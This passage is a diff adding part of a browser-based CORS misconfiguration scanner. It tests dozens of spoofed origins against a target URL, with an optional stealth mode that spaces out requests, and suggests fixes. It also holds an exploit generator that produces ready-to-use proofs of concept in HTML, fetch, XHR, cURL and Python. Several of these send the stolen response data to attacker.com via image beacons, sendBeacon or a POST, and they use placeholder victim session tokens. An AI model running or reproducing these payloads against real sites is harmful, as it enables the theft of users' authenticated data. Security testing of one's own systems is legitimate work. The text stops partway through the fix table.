+  {id:'wildcard',    cat:'BASIC',    label:'Wildcard (*)',              testOrigin:'https://evil.com',                  httpM:'GET'},
+  {id:'reflect',     cat:'BASIC',    label:'Origin Reflection',         testOrigin:'https://attacker.com',             httpM:'GET'},
+  {id:'null',        cat:'BASIC',    label:'Null Origin',               testOrigin:'null',                             httpM:'GET'},
+  {id:'cred',        cat:'BASIC',    label:'Credential Reflection',     testOrigin:'https://attacker.com',             httpM:'GET'},
+  {id:'empty',       cat:'BASIC',    label:'Empty Origin',              testOrigin:'',                                 httpM:'GET'},
+  // ── DOMAIN TRICKS ──
+  {id:'subdomain',   cat:'DOMAIN',   label:'Subdomain Spoof',           testOrigin:'https://evil.'+host,               httpM:'GET'},
+  {id:'prefix',      cat:'DOMAIN',   label:'Prefix Bypass',             testOrigin:orig.replace('://','://evil.'),     httpM:'GET'},
+  {id:'suffix',      cat:'DOMAIN',   label:'Suffix Bypass',             testOrigin:'https://'+host+'.evil.com',        httpM:'GET'},
+  {id:'dotsuffix',   cat:'DOMAIN',   label:'Dot Suffix',                testOrigin:'https://'+host+'evil.com',         httpM:'GET'},
+  {id:'backtick',    cat:'DOMAIN',   label:'Backtick Bypass',           testOrigin:'https://'+host+'`.evil.com',       httpM:'GET'},
+  {id:'underscore',  cat:'DOMAIN',   label:'Underscore Bypass',         testOrigin:'https://'+host+'_.evil.com',       httpM:'GET'},
+  {id:'dashbypass',  cat:'DOMAIN',   label:'Dash Bypass',               testOrigin:'https://'+host+'-evil.com',        httpM:'GET'},
+  {id:'unescaped',   cat:'DOMAIN',   label:'Unescaped Dot Regex',       testOrigin:'https://'+host.replace(/\./g,'X'), httpM:'GET'},
+  {id:'specialtld',  cat:'DOMAIN',   label:'Special TLD Chain',         testOrigin:'https://'+host+'.attacker.co.uk',  httpM:'GET'},
+  {id:'ampersand',   cat:'DOMAIN',   label:'Ampersand Injection',       testOrigin:'https://'+host+'&.evil.com',       httpM:'GET'},
+  {id:'question',    cat:'DOMAIN',   label:'Question Mark',             testOrigin:'https://'+host+'?.evil.com',       httpM:'GET'},
+  {id:'hashbypass',  cat:'DOMAIN',   label:'Hash Bypass',               testOrigin:'https://'+host+'#.evil.com',       httpM:'GET'},
+  // ── PROTOCOL ABUSE ──
+  {id:'http',        cat:'PROTOCOL', label:'HTTP Downgrade',            testOrigin:orig.replace('https://','http://'), httpM:'GET'},
+  {id:'httpswww',    cat:'PROTOCOL', label:'HTTPS www Prefix',          testOrigin:'https://www.'+host,                httpM:'GET'},
+  {id:'ftp',         cat:'PROTOCOL', label:'FTP Origin',                testOrigin:'ftp://evil.com',                   httpM:'GET'},
+  {id:'file',        cat:'PROTOCOL', label:'File Origin',               testOrigin:'file://',                          httpM:'GET'},
+  {id:'data',        cat:'PROTOCOL', label:'Data URI Origin',           testOrigin:'data://',                          httpM:'GET'},
+  {id:'chromext',    cat:'PROTOCOL', label:'Chrome Extension',          testOrigin:'chrome-extension://abcdef123456',  httpM:'GET'},
+  {id:'mozext',      cat:'PROTOCOL', label:'Firefox Extension',         testOrigin:'moz-extension://abcdef123456',     httpM:'GET'},
+  {id:'edgeext',     cat:'PROTOCOL', label:'Edge Extension',            testOrigin:'ms-browser-extension://abcdef',    httpM:'GET'},
+  {id:'wsorigin',    cat:'PROTOCOL', label:'WebSocket Origin',          testOrigin:'ws://attacker.com',                httpM:'GET'},
+  {id:'nullproto',   cat:'PROTOCOL', label:'No Protocol',               testOrigin:host,                               httpM:'GET'},
+  // ── ENCODING TRICKS ──
+  {id:'urlencode',   cat:'ENCODING', label:'URL-Encoded Origin',        testOrigin:'https%3A%2F%2Fevil.com',           httpM:'GET'},
+  {id:'unicode',     cat:'ENCODING', label:'Unicode Domain',            testOrigin:'https://ℯvil.com',                 httpM:'GET'},
+  {id:'doubleenc',   cat:'ENCODING', label:'Double Encoding',           testOrigin:'https%253A%252F%252Fevil.com',     httpM:'GET'},
+  {id:'tabinject',   cat:'ENCODING', label:'Tab Injection',             testOrigin:'https://evil.com\t',               httpM:'GET'},
+  {id:'newline',     cat:'ENCODING', label:'Newline Injection',         testOrigin:'https://evil.com\r\n',             httpM:'GET'},
+  {id:'space',       cat:'ENCODING', label:'Space Injection',           testOrigin:'https://evil.com ',                httpM:'GET'},
+  {id:'charcode0',   cat:'ENCODING', label:'Null Byte Injection',       testOrigin:'https://evil.com%00',              httpM:'GET'},
+  {id:'base64url',   cat:'ENCODING', label:'Base64 Obfuscation',        testOrigin:'data:text/html;base64,PHNjcmlwdD4=',httpM:'GET'},
+  // ── HEADER EXPLOITS ──
+  {id:'preflight',   cat:'HEADERS',  label:'Preflight Bypass',          testOrigin:'https://attacker.com',             httpM:'OPTIONS'},
+  {id:'customhdr',   cat:'HEADERS',  label:'Custom Header Leak',        testOrigin:'https://attacker.com',             httpM:'OPTIONS'},
+  {id:'exposehdr',   cat:'HEADERS',  label:'Expose-Headers Wildcard',   testOrigin:'https://attacker.com',             httpM:'GET'},
+  {id:'maxage',      cat:'HEADERS',  label:'Excessive Max-Age',         testOrigin:'https://attacker.com',             httpM:'OPTIONS'},
+  {id:'corssafelst', cat:'HEADERS',  label:'CORS-Safelisted Inject',    testOrigin:'https://attacker.com',             httpM:'GET'}, 
+  // ── METHOD EXPLOITS ──
+  {id:'put',         cat:'METHODS',  label:'PUT Method',                testOrigin:'https://attacker.com',             httpM:'PUT'},
+  {id:'delete',      cat:'METHODS',  label:'DELETE Method',             testOrigin:'https://attacker.com',             httpM:'DELETE'},
+  {id:'patch',       cat:'METHODS',  label:'PATCH Method',              testOrigin:'https://attacker.com',             httpM:'PATCH'},
+  {id:'allmethods',   cat:'METHODS',  label:'All Methods Wildcard',      testOrigin:'https://attacker.com',             httpM:'OPTIONS'},
+  // ── ADVANCED ──
+  {id:'postread',    cat:'ADVANCED', label:'POST Body Read',            testOrigin:'https://attacker.com',             httpM:'POST'},
+  {id:'varymissing', cat:'ADVANCED', label:'Vary Header Missing',       testOrigin:'https://attacker.com',             httpM:'GET'},
+  {id:'casesens',    cat:'ADVANCED', label:'Case Sensitivity',          testOrigin:orig.toUpperCase(),                 httpM:'GET'},
+  {id:'portbypass',  cat:'ADVANCED', label:'Port-Based Bypass',         testOrigin:'https://'+host+':443',             httpM:'GET'},
+  {id:'port80',      cat:'ADVANCED', label:'Explicit Port 80/443',      testOrigin:orig.replace('https://','https://')+':80',  httpM:'GET'},
+  {id:'ipv4',        cat:'ADVANCED', label:'IPv4 Origin',               testOrigin:'http://127.0.0.1',                 httpM:'GET'},
+  {id:'ipv6',        cat:'ADVANCED', label:'IPv6 Origin',               testOrigin:'http://[::1]',                     httpM:'GET'},
+  {id:'localhost',   cat:'ADVANCED', label:'Localhost Origin',           testOrigin:'http://localhost',                 httpM:'GET'},
+  {id:'multiorigin', cat:'ADVANCED', label:'Multiple Origins',          testOrigin:'https://evil.com https://ok.com',  httpM:'GET'},
+  {id:'subxss',      cat:'ADVANCED', label:'Trusted Subdomain XSS',     testOrigin:'https://xss.'+host,                httpM:'GET'},
+  {id:'intranet',    cat:'ADVANCED', label:'Intranet IP',               testOrigin:'http://192.168.1.1',               httpM:'GET'},
+  {id:'redirect',    cat:'ADVANCED', label:'Redirect Chain Origin',     testOrigin:'https://evil.com/redirect?to='+orig, httpM:'GET'},
+  ];
+  if(scanMode==='normal') return ALL.filter(v=>['wildcard','reflect','null','cred','subdomain','prefix','suffix','http','preflight','put','delete'].includes(v.id));
+  return ALL;
+}
+</script>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════════════
+// ENTRY POINT
+// ═══════════════════════════════════════════════════════════════════════════════
+function startScan(){if(scanning)return;runDeepScan()}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// CLASSIFY VECTOR
+// ═══════════════════════════════════════════════════════════════════════════════
+function classifyVector(v,rNo,rWith){
+  // Special checks for header-specific vectors
+  if(v.id==='exposehdr'&&rNo.fetched){const eh=rNo.ch['access-control-expose-headers']||'';if(eh==='*')return{vuln:true,type:'EXPOSE-ALL',detail:'Expose-Headers: * — all headers readable',bestResult:rNo}}
+  if(v.id==='maxage'&&rNo.fetched){const ma=parseInt(rNo.ch['access-control-max-age']||'0');if(ma>86400)return{vuln:true,warn:true,type:'MAX-AGE',detail:'Max-Age: '+ma+' (>24h cache poison risk)',bestResult:rNo}}
+  if(v.id==='varymissing'&&rNo.fetched&&rNo.ch['access-control-allow-origin']&&!rNo.ch['vary']){return{vuln:true,warn:true,type:'NO-VARY',detail:'No Vary:Origin header → cache poisoning',bestResult:rNo}}
+  if(v.id==='customhdr'&&rNo.fetched){const ah=rNo.ch['access-control-allow-headers']||'';if(ah==='*'||ah.toLowerCase().includes('x-custom'))return{vuln:true,type:'CUSTOM-HDR',detail:'Custom headers allowed: '+ah,bestResult:rNo}}
+  if(v.id==='allmethods'&&rNo.fetched){const am=rNo.ch['access-control-allow-methods']||'';if(am==='*'||am.split(',').length>=5)return{vuln:true,type:'ALL-METHODS',detail:'All methods: '+am,bestResult:rNo}}
+
+  // No-cred fetch returned data → wildcard / open CORS
+  if(rNo.fetched&&rNo.bodyOk){
+    const acao=rNo.ch['access-control-allow-origin']||'(none)';
+    return{vuln:true,type:acao==='*'?'WILDCARD':acao?'ORIGIN-ALLOWED':'NO-HEADERS-EXPOSED',detail:'Data returned! ACAO: '+acao,bestResult:rNo};
+  }
+  // No-cred succeeded no body — check headers
+  if(rNo.fetched&&!rNo.bodyOk){
+    const acao=rNo.ch['access-control-allow-origin']||'', acam=rNo.ch['access-control-allow-methods']||'';
+    if(acao==='*')return{vuln:true,type:'WILDCARD',detail:'ACAO:* returned',bestResult:rNo};
+    if(acao===v.testOrigin)return{vuln:true,type:'REFLECT',detail:'Origin reflected: '+acao,bestResult:rNo};
+    if(acao==='null'&&v.id==='null')return{vuln:true,type:'NULL-ORIGIN',detail:'Null origin accepted',bestResult:rNo};
+    if(['put','delete','patch'].includes(v.id)&&acam?.includes(v.httpM))return{vuln:true,type:'METHOD',detail:v.httpM+' allowed: '+acam,bestResult:rNo};
+    if(v.id==='preflight'&&acao)return{vuln:true,type:'PREFLIGHT',detail:'Preflight OK: '+(acam||'?'),bestResult:rNo};
+    if(acao)return{vuln:true,type:'ORIGIN-ALLOWED',detail:'ACAO: '+acao,bestResult:rNo};
+  }
+  // With-cred returned data → credential reflection (critical)
+  if(rWith.fetched&&rWith.bodyOk){
+    const acao=rWith.ch['access-control-allow-origin']||'', acac=rWith.ch['access-control-allow-credentials']||'';
+    if(acac==='true'&&acao)return{vuln:true,type:'CRED-REFLECT',detail:'Credentials accepted! ACAO:'+acao+' ACAC:true',bestResult:rWith};
+    return{vuln:true,type:'CRED-DATA',detail:'Data returned with credentials',bestResult:rWith};
+  }
+  // With-cred headers only
+  if(rWith.fetched){
+    const acao=rWith.ch['access-control-allow-origin']||'', acac=rWith.ch['access-control-allow-credentials']||'';
+    if(acac==='true'&&acao&&acao!=='*')return{vuln:true,type:'CRED-REFLECT',detail:'Credential reflection: '+acao+' + ACAC:true',bestResult:rWith};
+  }
+  return{vuln:false,warn:false,detail:rNo.blocked?'Blocked':'HTTP '+(rNo.status||'err'),bestResult:rNo};
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// DEEP SCAN ENGINE
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runDeepScan(){
+  resetUI();
+  const url=$('urlInput').value.trim();
+  if(!url){showErr('Please enter a URL.');return}
+  try{new URL(url)}catch{showErr('Invalid URL format.');return}
+
+  const btn=$('scanBtn'); btn.disabled=true; scanning=true;
+  const vectors=getVectors(url);
+  const totalReqs=vectors.length*2;
+  const isStealth=scanMode==='stealth';
+
+  const rows=vectors.map(v=>({...v,state:'pending',detail:v.testOrigin,resultNoCred:null,resultWithCred:null,vuln:false}));
+
+  showPanels();
+  setVerdict('info','⏳',scanMode.toUpperCase()+' SCAN RUNNING…',
+    'Testing '+rows.length+' vectors × 2 modes = '+totalReqs+' requests'+(isStealth?' (stealth delays active)':''));
+  setLeft('blue','blue','// Exploit Vectors ('+rows.length+')',buildTable(rows));
+  $('riskBody').innerHTML='<div style="color:var(--dim);font-size:11px;padding:8px 0">Scanning…</div>';
+  setData('','','// Response Body','<div class="ecenter"><div class="icon">⏳</div><div class="lbl">Waiting</div></div>');
+
+  const findings=[];
+  for(let i=0;i<rows.length;i++){
+    const v=rows[i];
+    rows[i].state='running';rows[i].detail='Testing…';
+    $('leftBody').innerHTML=buildTable(rows);
+    const pct=((i*2)/totalReqs)*100;
+    setStatus('['+((i+1))+'/'+rows.length+'] '+v.cat+' → '+v.label+(isStealth?' (stealth)':''),pct);
+
+    if(isStealth) await new Promise(r=>setTimeout(r,300+Math.random()*700));
+
+    const rNoCred=await doFetch(url,v.testOrigin,v.httpM,'omit');
+    rows[i].resultNoCred=rNoCred;
+    setStatus('['+((i+1))+'/'+rows.length+'] '+v.label+' — with-cred',((i*2+1)/totalReqs)*100);
+
+    if(isStealth) await new Promise(r=>setTimeout(r,200+Math.random()*500));
+
+    const rWithCred=await doFetch(url,v.testOrigin,v.httpM,'include');
+    rows[i].resultWithCred=rWithCred;
+
+    const result=classifyVector(v,rNoCred,rWithCred);
+    rows[i].state=result.vuln?'vuln':(result.warn?'warn':'safe');
+    rows[i].detail=result.detail;
+    rows[i].vulnType=result.type;
+    rows[i].bestResult=result.bestResult;
+    rows[i].vuln=result.vuln;
+    if(result.vuln||result.warn)findings.push(rows[i]);
+
+    $('leftBody').innerHTML=buildTable(rows);
+    await new Promise(r=>setTimeout(r,40));
+  }
+
+  clearStatus();
+  $('leftBody').innerHTML=buildTable(rows);
+  renderResults(rows,findings,url);
+  scanning=false;btn.disabled=false;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// RENDER RESULTS
+// ═══════════════════════════════════════════════════════════════════════════════
+function renderResults(rows,findings,url){
+  const vulnF=findings.filter(f=>f.vuln), warnF=findings.filter(f=>!f.vuln);
+  const safeCount=rows.filter(r=>r.state==='safe').length;
+
+  if(vulnF.length===0&&warnF.length===0){
+    setVerdict('safe','🛡️','CORS SECURE — ALL '+rows.length+' VECTORS BLOCKED',
+      'Tested '+rows.length+' vectors in '+scanMode+' mode with both credential modes. No exposure found.',
+      '<span class="v-stat"><b>'+rows.length+'</b> tested</span><span class="v-stat"><b>'+safeCount+'</b> blocked</span><span class="v-stat"><b>0</b> exposed</span>');
+    $('riskBody').innerHTML='<div class="risk-wrap"><span class="rtag low">✔ All '+rows.length+' vectors blocked</span><span class="rtag low">✔ Both credential modes tested</span></div>'+
+      '<div class="sugg-block"><div class="sugg-title">// Recommendations</div>'+
+      mkSugg('blue','Test Authenticated Endpoints','Scan /api/me, /api/user, /api/profile endpoints with session cookies.','Log in first, then paste Cookie/Bearer token.')+
+      mkSugg('blue','Verify Vary Header','Ensure Vary: Origin is set to prevent cache poisoning.','Vary: Origin')+
+      '</div>';
+    setData('','','// Response Body','<div class="ecenter" style="color:var(--accent)"><div class="icon">🛡️</div><div class="lbl" style="color:var(--accent)">No Data Exposed</div><div class="sub">All vectors blocked</div></div>');
+    saveScanToBackend({url,method:'ALL',mode:scanMode,verdict:'All vectors blocked',risk_level:'safe',findings:rows.map(r=>({name:r.label,state:r.state,detail:r.detail})),headers:{},response_preview:'',with_credentials:withCred});
+    return;
+  }
+
+  const hasCrit=vulnF.some(f=>f.bestResult?.ch?.['access-control-allow-credentials']==='true');
+  const cls=hasCrit?'crit':'vuln';
+  setVerdict(cls,hasCrit?'💀':'🚨',
+    'CORS EXPLOITABLE — '+vulnF.length+' VECTOR'+(vulnF.length>1?'S':'')+' EXPOSED',
+    vulnF.map(f=>f.label+' ['+f.vulnType+']').join(' · '),
+    '<span class="v-stat"><b>'+rows.length+'</b> tested</span><span class="v-stat"><b class="r">'+vulnF.length+'</b> vulnerable</span>'+(warnF.length?'<span class="v-stat"><b class="y">'+warnF.length+'</b> warnings</span>':''));
+
+  let rhtml='<div class="risk-wrap">';
+  vulnF.forEach(f=>{
+    const ic=f.bestResult?.ch?.['access-control-allow-credentials']==='true';
+    rhtml+='<span class="rtag '+(ic?'crit':'high')+'">'+(ic?'💀':'🚨')+' '+esc(f.label)+': '+esc(f.detail)+'</span>';
+  });
+  warnF.forEach(f=>{rhtml+='<span class="rtag medium">⚠ '+esc(f.label)+': '+esc(f.detail)+'</span>'});
+  rhtml+='</div>';
+
+  // Fix suggestions
+  rhtml+='<div class="sugg-block"><div class="sugg-title red">// Fix Suggestions</div>';
+  vulnF.forEach((f,i)=>{const s=getSugg(f.id,f.bestResult?.ch||{});rhtml+=mkSugg('red',(i+1)+'. '+f.label+' ('+f.vulnType+')',s.text,s.code)});
+  rhtml+='</div>';
+
+  // Exploit payloads
+  rhtml+='<div class="sugg-block"><div class="sugg-title orange">// 💣 Exploit Payloads (PoC)</div>';
+  vulnF.forEach((f,i)=>{
+    const payloads=generateExploitPayloads(url,f);
+    rhtml+='<div class="exploit-panel"><div class="exploit-title">💣 '+esc(f.label)+' — '+esc(f.vulnType)+'</div>';
+    rhtml+='<div class="exploit-tabs">';
+    rhtml+='<div class="exploit-tab on" onclick="showExploit(this,\'html\','+i+')">HTML PoC</div>';
+    rhtml+='<div class="exploit-tab" onclick="showExploit(this,\'fetch\','+i+')">Fetch JS</div>';
+    rhtml+='<div class="exploit-tab" onclick="showExploit(this,\'xhr\','+i+')">XHR</div>';
+    rhtml+='<div class="exploit-tab" onclick="showExploit(this,\'curl\','+i+')">cURL</div>';
+    rhtml+='<div class="exploit-tab" onclick="showExploit(this,\'python\','+i+')">Python</div>';
+    rhtml+='</div>';
+    rhtml+='<div class="exploit-code" id="exploit-'+i+'">'+esc(payloads.html)+'</div>';
+    rhtml+='<div class="gone" id="exploit-'+i+'-html">'+esc(payloads.html)+'</div>';
+    rhtml+='<div class="gone" id="exploit-'+i+'-fetch">'+esc(payloads.fetch)+'</div>';
+    rhtml+='<div class="gone" id="exploit-'+i+'-xhr">'+esc(payloads.xhr)+'</div>';
+    rhtml+='<div class="gone" id="exploit-'+i+'-curl">'+esc(payloads.curl)+'</div>';
+    rhtml+='<div class="gone" id="exploit-'+i+'-python">'+esc(payloads.python)+'</div>';
+    rhtml+='<button class="copy-btn" onclick="copyExploit('+i+')">📋 COPY</button>';
+    rhtml+='</div>';
+  });
+  rhtml+='</div>';
+  $('riskBody').innerHTML=rhtml;
+
+  // Show data from best finding
+  const best=vulnF.find(f=>f.bestResult?.bodyOk)||vulnF[0];
+  const br=best.bestResult||{};
+  const acao=br.ch?.['access-control-allow-origin']||'(none)';
+  let dd='<div class="data-warn">🚨 Vector: '+esc(best.label)+' · Type: '+esc(best.vulnType)+'<br>Test Origin: '+esc(best.testOrigin)+' → ACAO: '+esc(acao)+' · HTTP '+(br.status||'?')+'</div>';
+  if(br.bodyOk){let disp=br.body;try{disp=JSON.stringify(JSON.parse(br.body),null,2)}catch(_){}dd+='<div class="data-code">'+esc(disp.substring(0,6000))+(br.body.length>6000?'\n…(truncated)':'')+'</div>'}
+  else if(Object.keys(br.ch||{}).length){dd+='<div class="data-code">'+Object.entries(br.ch).map(([k,v])=>esc(k)+': '+esc(v)).join('\n')+'</div>'}
+  setData('red','red','// ⚠ Exposed Data',dd);
+
+  saveScanToBackend({url,method:'ALL',mode:scanMode,verdict:vulnF.length+' vectors exposed',risk_level:hasCrit?'critical':'high',findings:rows.map(r=>({name:r.label,cat:r.cat,state:r.state,detail:r.detail})),headers:{},response_preview:vulnF[0]?.bestResult?.bodyOk?vulnF[0].bestResult.body:'',with_credentials:withCred});
+}
+
+function showExploit(el,type,idx){
+  el.parentElement.querySelectorAll('.exploit-tab').forEach(t=>t.classList.remove('on'));
+  el.classList.add('on');
+  const src=document.getElementById('exploit-'+idx+'-'+type);
+  if(src)document.getElementById('exploit-'+idx).textContent=src.textContent;
+}
+function copyExploit(idx){
+  const el=document.getElementById('exploit-'+idx);
+  navigator.clipboard.writeText(el.textContent).then(()=>{
+    const old=el.style.borderColor;el.style.borderColor='var(--accent)';
+    setTimeout(()=>el.style.borderColor=old,600);
+  });
+}
+</script>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════════════
+// EXPLOIT PAYLOAD GENERATOR — generates ready-to-use PoC for every vuln type
+// ═══════════════════════════════════════════════════════════════════════════════
+function generateExploitPayloads(targetUrl,finding){
+  const origin=finding.testOrigin||'https://attacker.com';
+  const hasCred=finding.bestResult?.ch?.['access-control-allow-credentials']==='true';
+  const credStr=hasCred?',credentials:"include"':'';
+  const credBool=hasCred?'true':'false';
+
+  const html=`<!DOCTYPE html>
+<html>
+<head><title>CORS Exploit PoC — ${finding.label}</title></head>
+<body>
+<h2>CORS Exploit: ${finding.label} (${finding.vulnType})</h2>
+<p>Target: ${targetUrl}</p>
+<p>Origin: ${origin}</p>
+<pre id="result">Exploiting...</pre>
+<script>
+fetch("${targetUrl}", {
+  method: "${finding.httpM||'GET'}",
+  mode: "cors",
+  credentials: "${hasCred?'include':'omit'}",
+  headers: { "Origin": "${origin}" }
+})
+.then(r => r.text())
+.then(data => {
+  document.getElementById("result").textContent = "STOLEN DATA:\\n" + data;
+  // Exfiltrate to attacker server:
+  new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(data);
+})
+.catch(e => document.getElementById("result").textContent = "Error: " + e);
+<` + `/script>
+</body>
+</html>`;
+
+  const fetchJs=`// CORS Exploit — ${finding.label} (${finding.vulnType})
+// Target: ${targetUrl}
+// Test Origin: ${origin}
+
+fetch("${targetUrl}", {
+  method: "${finding.httpM||'GET'}",
+  mode: "cors",
+  credentials: "${hasCred?'include':'omit'}"${credStr ? '' : ''}
+})
+.then(response => {
+  console.log("Status:", response.status);
+  console.log("ACAO:", response.headers.get("access-control-allow-origin"));
+  console.log("ACAC:", response.headers.get("access-control-allow-credentials"));
+  return response.text();
+})
+.then(body => {
+  console.log("STOLEN DATA:", body);
+  // Exfiltrate:
+  navigator.sendBeacon("https://attacker.com/exfil", body);
+})
+.catch(err => console.error("Blocked:", err));`;
+
+  const xhr=`// CORS Exploit via XMLHttpRequest — ${finding.label}
+var xhr = new XMLHttpRequest();
+xhr.open("${finding.httpM||'GET'}", "${targetUrl}", true);
+xhr.withCredentials = ${credBool};
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4) {
+    console.log("Status: " + xhr.status);
+    console.log("ACAO: " + xhr.getResponseHeader("Access-Control-Allow-Origin"));
+    console.log("STOLEN DATA: " + xhr.responseText);
+    // Exfiltrate
+    new Image().src = "https://attacker.com/log?d=" + encodeURIComponent(xhr.responseText);
+  }
+};
+xhr.send();`;
+
+  const curl=`# CORS Exploit via cURL — ${finding.label} (${finding.vulnType})
+# Tests if the server reflects the attacker's origin
+
+curl -v "${targetUrl}" \\
+  -H "Origin: ${origin}" \\
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \\
+  -H "Accept: */*" \\
+  ${hasCred?'-H "Cookie: session=VICTIM_SESSION_TOKEN" \\':''}--include 2>&1 | grep -i "access-control"
+
+# Full response with verbose headers:
+curl -s -D - "${targetUrl}" \\
+  -H "Origin: ${origin}" \\
+  -o /dev/null | head -30
+
+# POST-based:
+curl -X POST "${targetUrl}" \\
+  -H "Origin: ${origin}" \\
+  -H "Content-Type: application/json" \\
+  -d '{"test":"cors-exploit"}' --include`;
+
+  const python=`#!/usr/bin/env python3
+"""CORS Exploit PoC — ${finding.label} (${finding.vulnType})"""
+import requests
+
+TARGET = "${targetUrl}"
+EVIL_ORIGIN = "${origin}"
+EXFIL_URL = "https://attacker.com/log"
+
+headers = {
+    "Origin": EVIL_ORIGIN,
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Accept": "*/*",
+}
+${hasCred?'cookies = {"session": "VICTIM_SESSION_TOKEN"}  # Stolen session\n':''}
+response = requests.${(finding.httpM||'GET').toLowerCase()}(
+    TARGET,
+    headers=headers,
+    ${hasCred?'cookies=cookies,':''}
+    allow_redirects=False
+)
+
+print(f"[*] Status: {response.status_code}")
+acao = response.headers.get("Access-Control-Allow-Origin", "NONE")
+acac = response.headers.get("Access-Control-Allow-Credentials", "NONE")
+print(f"[*] ACAO: {acao}")
+print(f"[*] ACAC: {acac}")
+
+if acao == EVIL_ORIGIN or acao == "*":
+    print(f"[!!!] VULNERABLE — Data stolen:")
+    print(response.text[:2000])
+    # Exfiltrate
+    requests.post(EXFIL_URL, data={"stolen": response.text})
+else:
+    print("[-] Not exploitable from this origin")`;
+
+  return{html,fetch:fetchJs,xhr,curl,python};
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// TABLE BUILDER — with category grouping
+// ═══════════════════════════════════════════════════════════════════════════════
+function buildTable(rows){
+  const icons={pending:'○',running:'◌',safe:'✔',vuln:'✘',warn:'⚠',skip:'—'};
+  let h='<table class="scan-table"><tr><th>#</th><th>Cat</th><th>Vector</th><th>Result</th><th>Detail</th></tr>';
+  let lastCat='';
+  rows.forEach((r,i)=>{
+    if(r.cat!==lastCat){
+      h+='<tr class="cat-row"><td colspan="5">━━ '+esc(r.cat)+' ━━</td></tr>';
+      lastCat=r.cat;
+    }
+    h+='<tr class="scan-row st-'+r.state+'"><td>'+(icons[r.state]||'?')+'</td><td>'+esc(r.cat)+'</td><td>'+esc(r.label)+'</td><td>'+r.state.toUpperCase()+'</td><td>'+esc(r.detail)+'</td></tr>';
+  });
+  return h+'</table>';
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// SUGGESTION HELPER
+// ═══════════════════════════════════════════════════════════════════════════════
+function mkSugg(color,head,text,code){
+  const cls={red:' red-s',yellow:' yellow-s',purple:' purple-s',orange:' orange-s'}[color]||'';
+  return '<div class="sugg-item'+cls+'"><div class="sugg-badge">FIX</div><div><div class="sugg-head">'+esc(head)+'</div><div class="sugg-text">'+esc(text)+'</div><div class="sugg-code">'+esc(code)+'</div></div></div>';
+}
+
+function getSugg(id,ch){
+  const m={
+    wildcard:{text:'Remove wildcard — use a hardcoded origin allowlist.',code:'Access-Control-Allow-Origin: https://your-app.com'},
+    reflect:{text:'Validate Origin against a strict Set.has() before reflecting.',code:'if (ALLOWED.has(req.headers.origin)) res.setHeader("ACAO", origin);'},
+    null:{text:'Never allow null origin — reject it explicitly.',code:'if (origin === "null") return reject;'},
+    empty:{text:'Empty origin allows non-browser clients to bypass checks.',code:'Require valid origin header for cross-origin requests.'},
+    subdomain:{text:'Use exact string match only — never endsWith().',code:'const ALLOWED = new Set(["https://app.yourdomain.com"]);'},
+    prefix:{text:'Avoid startsWith() — attacker can register evil-yourdomain.com.',code:'Use Set.has() with full origin strings.'},
+    suffix:{text:'Avoid endsWith() — yourdomain.com.evil.com passes.',code:'Use Set.has() with full origin strings.'},
+    dotsuffix:{text:'Regex dot is not escaped — evil.comevil.com matches.',code:'Escape dots in regex: /^https:\\/\\/exact\\.domain\\.com$/'},
+    backtick:{text:'Backtick in origin bypasses some regex validators.',code:'Sanitize origin before regex matching.'},
+    underscore:{text:'Underscore in domain bypasses endsWith/includes checks.',code:'Use Set.has() with full origin strings.'},
+    dashbypass:{text:'Dash-based domain like target-evil.com bypasses prefix checks.',code:'Use Set.has() — never pattern matching.'},
+    unescaped:{text:'Unescaped dot in regex allows any char to match.',code:'Escape: /^https:\\/\\/exact\\.domain\\.com$/'},
+    specialtld:{text:'TLD chain like target.com.attacker.co.uk bypasses suffix checks.',code:'Use Set.has() with full origin strings.'},
+    ampersand:{text:'Ampersand injection bypasses poor regex/split logic.',code:'Use URL parser on origin before matching.'},
+    question:{text:'Question mark injection bypasses path matching.',code:'Use standard URL parsing to validate host.'},
+    hashbypass:{text:'Hash injection bypasses path matching.',code:'Use standard URL parsing to extract origin host.'},
+    http:{text:'Reject HTTP origins when API is HTTPS.',code:'if (!origin.startsWith("https://")) return 403;'},
+    httpswww:{text:'www prefix may bypass exact origin checks.',code:'Include both www and non-www in allowlist.'},
+    ftp:{text:'FTP origin should never be allowed.',code:'Only allow https:// origins.'},
+    file:{text:'file:// origin should be blocked.',code:'Reject all non-https origins.'},
+    data:{text:'data:// origin should be blocked.',code:'Only allow https:// origins.'},
+    chromext:{text:'Chrome extension origins should require explicit allowlisting.',code:'Only allow known extension IDs if needed.'},
+    mozext:{text:'Firefox extension origin allowed.',code:'Only allow specific moz-extension:// origins if necessary.'},
+    edgeext:{text:'Edge extension origin allowed.',code:'Restrict to specific Microsoft extension identifiers.'},
+    wsorigin:{text:'WebSocket origin (ws://) reflected via HTTP.',code:'Validate protocol is https:// when reflecting.'},
+    nullproto:{text:'Origin without protocol bypasses basic URL parsing.',code:'Require full https:// scheme in Origin.'},
+    urlencode:{text:'Server decodes URL-encoded origin — parser vulnerability.',code:'Validate origin BEFORE any decoding.'},
+    unicode:{text:'Unicode homograph domain accepted.',code:'Normalize and reject non-ASCII domains.'},
+    doubleenc:{text:'Double-encoded origin bypasses validation.',code:'Never double-decode origins.'},
+    tabinject:{text:'Tab character injection bypasses origin validation.',code:'Strip control characters from Origin header.'},
+    newline:{text:'Newline injection in origin — header injection risk.',code:'Reject origins with \\r, \\n, or control chars.'},
+    space:{text:'Space in origin bypasses some parsers.',code:'Trim and validate origin strictly.'},
+    charcode0:{text:'Null byte injection truncates origin validation check.',code:'Reject domains containing null bytes (%00).'},
+    base64url:{text:'Base64 encoded data URI bypasses URL extraction.',code:'Ensure valid protocol (https) before checking.'},
+    preflight:{text:'Restrict preflight to required methods and headers.',code:'Access-Control-Allow-Methods: GET, POST\nAccess-Control-Max-Age: 600'},
+    customhdr:{text:'Custom headers allowed cross-origin — data exfiltration risk.',code:'Access-Control-Allow-Headers: Content-Type (only what is needed)'},
